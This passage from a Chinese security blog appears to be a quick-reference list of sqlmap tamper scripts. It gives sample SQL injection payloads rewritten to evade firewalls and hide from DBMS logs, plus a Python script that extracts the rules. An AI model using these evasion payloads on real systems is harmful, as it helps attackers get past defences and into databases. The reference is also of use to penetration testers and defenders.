+    &#39;1--%0AAND--%0A9227=9227&#39;
+
+</code></pre><h3 id="space2plus-py"><a href="#space2plus-py" class="headerlink" title="space2plus.py:"></a>space2plus.py:</h3><pre><code>Replaces space character (&#39; &#39;) with plus (&#39;+&#39;)
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
+    &#39;SELECT+id+FROM+users&#39;
+
+</code></pre><h3 id="space2randomblank-py"><a href="#space2randomblank-py" class="headerlink" title="space2randomblank.py:"></a>space2randomblank.py:</h3><pre><code>Replaces space character (&#39; &#39;) with a random blank character from a valid set of alternate characters
+</code></pre><pre><code>&gt;&gt;&gt; random.seed(0)
+    &gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
+
+</code></pre><h3 id="sp-password-py"><a href="#sp-password-py" class="headerlink" title="sp_password.py:"></a>sp_password.py:</h3><pre><code>Appends (MsSQL) function &#39;sp_password&#39; to the end of the payload for automatic obfuscation from DBMS logs
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;1 AND 9227=9227-- &#39;)
+    &#39;1 AND 9227=9227-- sp_password&#39;
+
+</code></pre><h3 id="symboliclogical-py"><a href="#symboliclogical-py" class="headerlink" title="symboliclogical.py:"></a>symboliclogical.py:</h3><pre><code>Replaces AND and OR logical operators with their symbolic counterparts (&amp;&amp; and ||)
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&quot;1 AND &#39;1&#39;=&#39;1&quot;)
+    &quot;1 %26%26 &#39;1&#39;=&#39;1&quot;
+
+</code></pre><h3 id="unionalltounion-py"><a href="#unionalltounion-py" class="headerlink" title="unionalltounion.py:"></a>unionalltounion.py:</h3><pre><code>Replaces instances of UNION ALL SELECT with UNION SELECT counterpart
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;-1 UNION ALL SELECT&#39;)
+    &#39;-1 UNION SELECT&#39;
+
+</code></pre><h3 id="unmagicquotes-py"><a href="#unmagicquotes-py" class="headerlink" title="unmagicquotes.py:"></a>unmagicquotes.py:</h3><pre><code>Replaces quote character (&#39;) with a multi-byte combo %BF%27 together with generic comment at the end (to make it work)
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&quot;1&#39; AND 1=1&quot;)
+    &#39;1%bf%27-- -&#39;
+
+</code></pre><h3 id="uppercase-py"><a href="#uppercase-py" class="headerlink" title="uppercase.py:"></a>uppercase.py:</h3><pre><code>Replaces each keyword character with upper case value (e.g. select -&gt; SELECT)
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;insert&#39;)
+    &#39;INSERT&#39;
+
+</code></pre><h3 id="varnish-py"><a href="#varnish-py" class="headerlink" title="varnish.py:"></a>varnish.py:</h3><pre><code>Appends a HTTP header &#39;X-originating-IP&#39; to bypass Varnish Firewall
+</code></pre><pre><code>Examples:
+&gt;&gt; X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)
+&gt;&gt; X-remote-IP: TARGET_PROXY_IP (184.189.250.X)
+&gt;&gt; X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)
+&gt;&gt; x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)
+&gt;&gt; X-remote-IP: * or %00 or %0A
+</code></pre><h3 id="versionedkeywords-py"><a href="#versionedkeywords-py" class="headerlink" title="versionedkeywords.py:"></a>versionedkeywords.py:</h3><pre><code>Encloses each non-function keyword with (MySQL) versioned comment
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#&#39;)
+    &#39;1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#&#39;
+
+</code></pre><h3 id="versionedmorekeywords-py"><a href="#versionedmorekeywords-py" class="headerlink" title="versionedmorekeywords.py:"></a>versionedmorekeywords.py:</h3><pre><code>Encloses each keyword with (MySQL) versioned comment
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#&#39;)
+    &#39;1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#&#39;
+
+</code></pre><h3 id="xforwardedfor-py"><a href="#xforwardedfor-py" class="headerlink" title="xforwardedfor.py:"></a>xforwardedfor.py:</h3><pre><code>Append a fake HTTP header &#39;X-Forwarded-For&#39;
+</code></pre><pre><code>headers = kwargs.get(&quot;headers&quot;, {})
+headers[&quot;X-Forwarded-For&quot;] = randomIP()
+headers[&quot;X-Client-Ip&quot;] = randomIP()
+headers[&quot;X-Real-Ip&quot;] = randomIP()
+</code></pre><hr>
+<p>脚本代码:</p>
+<pre class=" language-python"><code class="language-python">
+
+<span class="token keyword">import</span> re
+<span class="token keyword">import</span> os<span class="token punctuation">,</span>sys
+<span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"Sqlmap Tamper规则提取:\n"</span><span class="token punctuation">)</span>
+tamper_Regex<span class="token operator">=</span>re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'>>>.+\s.+\s'</span><span class="token punctuation">)</span>
+tamper_info_Regex<span class="token operator">=</span>re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'"""\s.+'</span><span class="token punctuation">)</span>
+os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>path<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+path<span class="token operator">=</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> <span class="token punctuation">(</span>path<span class="token punctuation">)</span>
+tamper_files<span class="token operator">=</span>os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> tamper_name <span class="token keyword">in</span> tamper_files<span class="token punctuation">:</span>
+    <span class="token keyword">if</span> tamper_name<span class="token operator">==</span><span class="token string">"tamper.py"</span> <span class="token operator">or</span> tamper_name<span class="token operator">==</span><span class="token string">"varnish.py"</span> <span class="token operator">or</span> tamper_name<span class="token operator">==</span><span class="token string">"xforwardedfor.py"</span> <span class="token operator">or</span> tamper_name<span class="token operator">==</span><span class="token string">"__init__.py"</span><span class="token punctuation">:</span>
+        <span class="token keyword">continue</span>
+    file<span class="token operator">=</span>path<span class="token operator">+</span><span class="token string">"\\"</span><span class="token operator">+</span>tamper_name
+    fo<span class="token operator">=</span>open<span class="token punctuation">(</span>file<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>
+    tamper_raw<span class="token operator">=</span>fo<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"### "</span><span class="token operator">+</span>tamper_name<span class="token operator">+</span><span class="token string">':'</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
+    info<span class="token operator">=</span>tamper_info_Regex<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>tamper_raw<span class="token punctuation">)</span>
+    rules<span class="token operator">=</span>tamper_Regex<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>tamper_raw<span class="token punctuation">)</span>
+    <span class="token keyword">print</span> <span class="token punctuation">(</span>info<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>'<span class="token string">""</span>"<span class="token string">','</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"```"</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span> <span class="token punctuation">(</span>rules<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token punctuation">(</span>rules<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        <span class="token keyword">pass</span>
+    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"```"</span><span class="token punctuation">)</span>
+    fo<span class="token punctuation">.</span>close
+
+</code></pre>
+
+        
+                <blockquote style="margin: 2em 0 0;padding: 0.5em 1em;border-left: 3px solid #F44336;background-color: #F5F5F5;list-style: none;">
+                    <p><strong>
+                         
+                            本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.转载请注明出处</a>
+                        </strong>
+                        <br>
+                        <strong>本文链接：</strong><a href="https://ares-x.com/2019/05/01/sqlmap-规则tamper规则速查/">https://ares-x.com/2019/05/01/sqlmap-规则tamper规则速查/</a>
+                    </p>
+                </blockquote>
+        
+    
+
+    
+</div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+    <div id="comment" style="padding:10px;" class="vcomment"></div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+    var GUEST_INFO = ['nick','mail','link'];
+    var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+        return GUEST_INFO.indexOf(item) > -1
+    });
+    var notify = 'false' == true;
+    var verify = 'false' == true;
+    new Valine({
+        el: '.vcomment',
+        notify: notify,
+        verify: verify,
+        appId: "03dPjIOLsmkJMRIjhK2oWRyf-gzGzoHsz",
+        appKey: "ryjaCKlEtRE4g5YBLLmS733Q",
+        placeholder: "来写下你的评论吧!(填写邮箱字段会及时收到回复通知)",
+        pageSize:'10',
+        avatar:'identicon',
+        lang:'zh-cn'
+    });
+</script>
+
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/2019/04/29/Metasploit基础使用/" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+        </div>
+    </div>
+
+
+
+                    
+                        <!-- Overlay For Active Sidebar -->
+<div class="sidebar-overlay"></div>
+
+<!-- Material sidebar -->
+<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
+    <div id="sidebar-main">
+        <!-- Sidebar Header -->
+        <div class="sidebar-header header-cover" style="background-image: url(https://cache-1253916356.file.myqcloud.com/img/sidebar.jpg);">
+    <!-- Top bar -->
+    <div class="top-bar"></div>
+
+    <!-- Sidebar toggle button -->
+    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
+        <i class="material-icons">clear_all</i>
+        <span class="mdl-button__ripple-container">
+            <span class="mdl-ripple">
+            </span>
+        </span>
+    </button>
+
+    <!-- Sidebar Avatar -->
+    <div class="sidebar-image">
+        <img src="https://cache-1253916356.file.myqcloud.com/img/aresx.png" alt="AresX's avatar">
+    </div>
+
+    <!-- Sidebar Email -->
+    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
+        YXJlc3hAcHJvdG9ubWFpbC5jb20=
+        <b class="caret"></b>
+    </a>
+</div>
+
+
+        <!-- Sidebar Navigation  -->
+        <ul class="nav sidebar-nav">
+    <!-- User dropdown  -->
+    <li class="dropdown">
+        <ul id="settings-dropdown" class="dropdown-menu">
+            
+                <li>
+                    <a href="mailto: YXJlc3hAcHJvdG9ubWFpbC5jb20=" target="_blank" title="Email Me">
+                        
+                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
+                        
+                        Email Me
+                    </a>
+                </li>
+            
+        </ul>
+    </li>
+
+    <!-- Homepage -->
+    
+        <li id="sidebar-first-li">
+            <a href="/">
+                
+                    <i class="material-icons sidebar-material-icons">home</i>
+                
+                主页
+            </a>
+        </li>
+        
+    
+
+    <!-- Archives  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                    <i class="material-icons sidebar-material-icons">inbox</i>
+                
+                    归档
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+            <li>
+                <a class="sidebar_archives-link" href="/archives/2019/05/">五月 2019<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/04/">四月 2019<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/10/">十月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/06/">六月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/05/">五月 2018<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/04/">四月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/03/">三月 2018<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/02/">二月 2018<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/01/">一月 2018<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">十二月 2017<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/11/">十一月 2017<span class="sidebar_archives-count">8</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/10/">十月 2017<span class="sidebar_archives-count">8</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/09/">九月 2017<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/08/">八月 2017<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/07/">七月 2017<span class="sidebar_archives-count">5</span></a>
+            </li></ul>
+        </li>
+        
+    
+
+    <!-- Categories  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                    <i class="material-icons sidebar-material-icons">chrome_reader_mode</i>
+                
+                分类
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+                <li>
+                <a class="sidebar_archives-link" href="/categories/CTF/">CTF<span class="sidebar_archives-count">9</span></a></li><li><a class="sidebar_archives-link" href="/categories/In-My-Heart/">In My Heart<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/categories/Linux/">Linux<span class="sidebar_archives-count">7</span></a></li><li><a class="sidebar_archives-link" href="/categories/屠龙之技/">屠龙之技<span class="sidebar_archives-count">11</span></a></li><li><a class="sidebar_archives-link" href="/categories/杂文/">杂文<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/categories/渗透不测试/">渗透不测试<span class="sidebar_archives-count">12</span></a></li><li><a class="sidebar_archives-link" href="/categories/编程无道/">编程无道<span class="sidebar_archives-count">3</span></a>
+            </li></ul>
+        </li>
+        
+    
+
+    <!-- Pages  -->
+    
+        <li>
+            <a href="/timeline" title="时间轴">
+                
+                    <i class="material-icons sidebar-material-icons">sort</i>
+                
+                时间轴
+            </a>
+        </li>
+        
+            <li class="divider"></li>
+        
+    
+        <li>
+            <a href="/about" title="关于我">
+                
+                    <i class="material-icons sidebar-material-icons">person</i>
+                
+                关于我
+            </a>
+        </li>
+        
+    
+        <li>
+            <a href="/links" title="友链">
+                
+                    <i class="material-icons sidebar-material-icons">group</i>
+                
+                友链
+            </a>
+        </li>
+        
+    
+
+    <!-- Article Number  -->
+    
+        <li>
+            <a href="/archives">
+                文章总数
+                <span class="sidebar-badge">52</span>
+            </a>
+        </li>
+        
+    
+</ul>
+
+
+        <!-- Sidebar Footer -->
+        <!--
+I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
+If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
+It will not impact the appearance and can give developers a lot of support :)
+
+很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
+如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
+它不会影响美观并可以给开发者很大的支持和动力。 :)
+-->
+
+<!-- Sidebar Divider -->
+
+    <div class="sidebar-divider"></div>
+
+
+<!-- Theme Material -->
+
+
+<!-- Help & Support -->
+<!--
+
+-->
+
+<!-- Feedback -->
+<!--
+
+-->
+
+<!-- About Theme -->
+<!--
+
+-->
+
+    </div>
+
+    <!-- Sidebar Image -->
+    
+
+</aside>
+
+                    
+
+                    
+                        <!-- Footer Top Button -->
+                        <div id="back-to-top" class="toTop-wrap">
+    <a href="#top" class="toTop">
+        <i class="material-icons footer_top-i">expand_less</i>
+    </a>
+</div>
+
+                    
+
+                    <!--Footer-->
+<footer class="mdl-mini-footer" id="bottom">
+    
+        <!-- Paradox Footer Left Section -->
+        <div class="mdl-mini-footer--left-section sns-list">
+    <!-- Twitter -->
+    
+
+    <!-- Facebook -->
+    
+
+    <!-- Google + -->
+    
+
+    <!-- Weibo -->
+    
+
+    <!-- Instagram -->
+    
+
+    <!-- Tumblr -->
+    
+
+    <!-- Github -->
+    
+        <a href="https://github.com/Ares-X" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-github">
+                <span class="visuallyhidden">Github</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- LinkedIn -->
+    
+
+    <!-- Zhihu -->
+    
+
+    <!-- Bilibili -->
+    
+
+    <!-- Telegram -->
+    
+        <a href="https://t.me/Axxxxk" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-telegram">
+                <span class="visuallyhidden">Telegram</span>
+            </button><!--
+     --></a>
+    
+    
+    <!-- V2EX -->
+    
+</div>
+
+
+        <!--Copyright-->
+        <div id="copyright">
+            Copyright&nbsp;©&nbsp;2017&nbsp;-<script type="text/javascript">var fd = new Date();document.write("&nbsp;" + fd.getFullYear() + "&nbsp;");</script>AresX's Blog
+            
+        </div>
+
+        <!-- Paradox Footer Right Section -->
+
+        <!--
+        I am glad you use this theme, the development is no so easy, I hope you can keep the copyright.
+        It will not impact the appearance and can give developers a lot of support :)
+
+        很高兴您使用该主题，开发不易，希望您可以保留一下版权声明。
+        它不会影响美观并可以给开发者很大的支持。 :)
+        -->
+
+        <div class="mdl-mini-footer--right-section">
+            <div>
+                <div class="footer-develop-div">Powered by <a href="https://hexo.io" target="_blank" class="footer-develop-a">Hexo</a></div>
+                <div class="footer-develop-div">Theme - <a href="https://github.com/viosey/hexo-theme-material" target="_blank" class="footer-develop-a">Material</a></div>
+            </div>
+        </div>
+    
+</footer>
+
+
+                    <!-- Import JS File -->
+
+    <script>lsloader.load("lazyload_js","https://cache-1253916356.file.myqcloud.com/source/js/lazyload.min.js", true)</script>
+
+
+
+    <script>lsloader.load("js_js","https://cache-1253916356.file.myqcloud.com/source/js/js.min.js", true)</script>
+
+
+
+    <script>lsloader.load("np_js","https://cache-1253916356.file.myqcloud.com/source/js/nprogress.js", true)</script>
+
+
+<script type="text/ls-javascript" id="NProgress-script">
+    NProgress.configure({
+        showSpinner: true
+    });
+    NProgress.start();
+    $('#nprogress .bar').css({
+        'background': '#29d'
+    });
+    $('#nprogress .peg').css({
+        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
+    });
+    $('#nprogress .spinner-icon').css({
+        'border-top-color': '#29d',
+        'border-left-color': '#29d'
+    });
+    setTimeout(function() {
+        NProgress.done();
+        $('.fade').removeClass('out');
+    }, 800);
+</script>
+
+
+
+
+
+
+
+    <!-- Busuanzi -->
+    <script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+   
+
+
+
+
+
+<!-- UC Browser Compatible -->
+<script>
+	var agent = navigator.userAgent.toLowerCase();
+	if(agent.indexOf('ucbrowser')>0) {
+		document.write('<link rel="stylesheet" href="/css/uc.css">');
+	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
+	}
+</script>
+
+<!-- Import prettify js  -->
+
+    
+        
+            <script>lsloader.load("prettify_js","https://cache-1253916356.file.myqcloud.com/source/js/prettify.min.js", true)</script>
+        
+    
+
+
+
+<!-- Window Load -->
+<!-- add class for prettify -->
+<script type="text/ls-javascript" id="window-load">
+    $(window).on('load', function() {
+        // Post_Toc parent position fixed
+        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
+    });
+
+    
+        
+            $(function() {
+                $('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+                prettyPrint();
+                })
+        
+    
+    
+</script>
+
+<!-- MathJax Load-->
+
+
+<!-- Bing Background -->
+
+
+<script type="text/ls-javascript" id="lazy-load">
+    // Offer LazyLoad
+    queue.offer(function(){
+        $('.lazy').lazyload({
+            effect : 'show'
+        });
+    });
+
+    // Start Queue
+    $(document).ready(function(){
+        setInterval(function(){
+            queue.execNext();
+        },200);
+    });
+</script>
+
+<!-- Custom Footer -->
+
+
+
+<script>
+    (function(){
+        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')
+
+        for (var i = 0; i < scriptList.length; ++i) {
+            var item = scriptList[i];
+            lsloader.runInlineScript(item.id,item.id);
+        }
+    })()
+console.log('\n %c © Material Theme | Version: 1.5.2 | https://github.com/viosey/hexo-theme-material %c \n', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;');
+</script>
+
+                </main>
+            </div>
+        </body>
+    
+</html>
